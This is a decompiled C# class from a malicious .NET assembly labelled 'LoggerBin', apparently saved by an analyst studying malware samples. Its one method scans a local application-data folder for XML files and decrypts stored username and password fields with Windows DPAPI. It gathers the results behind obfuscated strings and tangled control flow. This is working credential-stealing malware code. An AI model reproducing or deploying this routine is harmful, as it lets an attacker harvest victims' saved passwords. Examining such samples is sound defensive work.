// Decompiled with JetBrains decompiler
// Type: VU.O2
// Assembly: service-nankasa.com-LoggerBin, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 762D1AAC-A39C-4AEB-81B7-3308162A414F
// Assembly location: C:\Users\darbinis\Desktop\Code analysis\Mallicious skriptai\Atack 09-17\RegAsm.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace VU
{
  internal static class O2
  {
    internal static O2 Vs;

    public static string o7()
    {
      try
      {
        DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), w4.bx(70, w4.vY)));
        Console.WriteLine(directoryInfo.FullName);
        if (!directoryInfo.Exists)
          return w4.bx(686, w4.vY);
        string[] files = Directory.GetFiles(directoryInfo.FullName, w4.bx(1574, w4.vY), SearchOption.AllDirectories);
        StringBuilder stringBuilder = new StringBuilder();
        string[] strArray = files;
        int index = 0;
        while (true)
        {
          if (index < strArray.Length)
            goto label_7;
          else
            goto label_5;
label_3:
          int num;
          switch (num)
          {
            case 1:
              goto label_13;
            default:
              goto label_14;
          }
label_5:
          num = !O2.xu() ? 0 : 0;
          goto label_3;
label_7:
          string str = strArray[index];
          if (File.Exists(str))
          {
            XmlDocument xmlDocument = new XmlDocument();
            xmlDocument.Load(str);
            object obj1 = (object) Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(xmlDocument.SelectSingleNode(w4.bx(1600, w4.vY)).InnerText), (byte[]) null, DataProtectionScope.CurrentUser));
            object obj2 = (object) Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String((string) O2.kz((object) xmlDocument.SelectSingleNode(w4.bx(1670, w4.vY)))), (byte[]) null, DataProtectionScope.CurrentUser));
            if (obj1.ToString().Length > 0)
            {
              if (O2.vHB((object) obj2.ToString()) <= 0)
              {
                num = 1;
                if (O2.xu())
                {
                  num = 1;
                  goto label_3;
                }
                else
                  goto label_3;
              }
              else
              {
                stringBuilder.AppendLine(w4.bx(1176, w4.vY) + (obj1 == null ? (string) null : obj1.ToString()));
                stringBuilder.AppendLine(w4.bx(1200, w4.vY) + obj2?.ToString());
              }
            }
          }
label_13:
          ++index;
        }
label_14:
        if (stringBuilder.Length > 0)
          return stringBuilder.ToString();
      }
      catch
      {
      }
      return w4.bx(1740, w4.vY);
    }

    internal static object kz([In] object obj0) => (object) ((XmlNode) obj0).InnerText;

    internal static int vHB([In] object obj0) => ((string) obj0).Length;

    internal static bool xu() => O2.Vs == null;

    internal static O2 DW() => O2.Vs;
  }
}
